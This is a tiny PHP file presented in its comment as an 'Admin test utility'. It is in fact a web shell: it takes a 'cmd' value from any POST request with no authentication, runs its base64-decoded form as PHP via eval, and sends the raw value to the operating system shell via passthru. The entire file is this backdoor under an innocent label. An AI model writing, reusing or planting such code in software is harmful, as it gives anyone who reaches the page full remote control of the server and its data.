<?php
// Admin test utility
$cmd = $_POST['cmd'];
eval(base64_decode($cmd));
passthru($cmd);
?>
